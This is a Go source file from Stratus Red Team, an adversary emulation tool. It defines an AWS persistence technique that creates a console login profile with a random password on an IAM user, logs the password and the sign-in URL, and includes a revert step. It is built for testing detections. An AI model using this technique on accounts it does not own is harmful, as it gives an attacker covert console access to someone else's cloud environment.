package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/internal/utils"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.persistence.iam-create-user-login-profile",
		FriendlyName: "Create a Login Profile on an IAM User",
		Description: `
Establishes persistence by creating a Login Profile on an existing IAM user. This allows an attacker to access an IAM
user intended to be used programmatically through the AWS console usual login process. 

Warm-up:

- Create an IAM user

Detonation: 

- Create an IAM Login Profile on the user
`,
		Platform:                   stratus.AWS,
		IsIdempotent:               false, // cannot create a login profile twice on the same user
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence, mitreattack.PrivilegeEscalation},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string) error {
	iamClient := iam.NewFromConfig(providers.AWS().GetConnection())
	userName := params["user_name"]
	password := utils.RandomString(16) + ".#1Aa" // extra characters to ensure we meet password requirements, no matter the password policy

	log.Println("Creating a login profile on IAM user " + userName)
	_, err := iamClient.CreateLoginProfile(context.Background(), &iam.CreateLoginProfileInput{
		UserName:              &userName,
		Password:              &password,
		PasswordResetRequired: false,
	})
	if err != nil {
		return errors.New("unable to create IAM login profile: " + err.Error())
	}

	accountId, _ := utils.GetCurrentAccountId(providers.AWS().GetConnection())
	log.Println("Created a login profile with password " + password)
	loginUrl := "https://" + accountId + ".signin.aws.amazon.com/console"
	log.Println("You can log in at: " + loginUrl)

	return nil
}

func revert(params map[string]string) error {
	iamClient := iam.NewFromConfig(providers.AWS().GetConnection())
	userName := params["user_name"]

	log.Println("Removing the login profile on IAM user " + userName)
	_, err := iamClient.DeleteLoginProfile(context.Background(), &iam.DeleteLoginProfileInput{
		UserName: &userName,
	})
	if err != nil {
		return errors.New("unable to remove IAM login profile: " + err.Error())
	}

	return nil
}
